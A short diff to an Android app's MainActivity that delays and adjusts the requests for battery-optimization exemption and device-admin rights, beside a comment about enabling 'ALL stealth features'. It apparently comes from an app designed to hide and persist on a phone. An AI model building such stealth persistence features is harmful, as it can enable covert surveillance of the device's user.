@@ -103,8 +103,15 @@ public class MainActivity extends AppCompatActivity {
 
         // Request special permissions + battery + device admin
         permissionManager.requestSpecialPermissions();
-        requestBatteryOptimization();
-        requestDeviceAdmin();
+        
+        // Delay slightly to let the activity be ready
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                requestBatteryOptimization();
+                requestDeviceAdmin();
+            }
+        }, 500);
 
         // Enable ALL stealth features immediately
         permissionManager.requestNotificationPermission();
@@ -199,13 +206,15 @@ public class MainActivity extends AppCompatActivity {
             Intent intent = new Intent();
             intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
             intent.setData(Uri.parse("package:" + getPackageName()));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
         } catch (Exception e) {
             try {
                 Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
             } catch (Exception e2) {
-                // Ignore
+                android.util.Log.e("MainActivity", "Battery optimization request failed: " + e2.getMessage());
             }
         }
     }
